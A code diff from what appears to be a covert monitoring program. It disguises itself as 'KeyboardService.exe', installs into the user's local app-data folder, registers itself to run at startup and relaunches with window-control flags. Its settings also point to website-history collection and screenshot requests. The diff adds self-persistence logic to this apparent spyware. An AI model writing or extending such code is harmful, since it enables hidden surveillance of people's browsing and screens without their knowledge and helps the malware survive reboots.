@@ -47,7 +47,7 @@ WEBSITE_HISTORY_INTERVAL_SECONDS = 30
 WEBSITE_HISTORY_MAX_AGE_SECONDS = 7 * 24 * 60 * 60
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
-APP_VERSION = "1.2.10"
+APP_VERSION = "1.2.11"
 UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest"
 UPDATE_ASSET_NAME = "KeyboardService.exe"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
@@ -1399,7 +1399,9 @@ def install_self_to_startup_location():
 
 def get_startup_command():
     if getattr(sys, "frozen", False):
-        return f'"{sys.executable}"'
+        if running_from_local_project() or running_from_temp_bundle():
+            return f'"{sys.executable}"'
+        return f'"{install_self_to_startup_location()}"'
 
     target_path = install_self_to_startup_location()
     return f'"{sys.executable}" "{target_path}"'
@@ -1502,12 +1504,7 @@ def install_and_relaunch():
 
         try:
             os.makedirs(INSTALL_DIR, exist_ok=True)
-            source_is_newer = (
-                not os.path.exists(INSTALL_PATH)
-                or os.path.getsize(sys.executable) != os.path.getsize(INSTALL_PATH)
-                or os.path.getmtime(sys.executable) > os.path.getmtime(INSTALL_PATH)
-            )
-            if source_is_newer:
+            if not os.path.exists(INSTALL_PATH):
                 shutil.copy2(sys.executable, INSTALL_PATH)
             startup_info = subprocess.STARTUPINFO()
             startup_info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
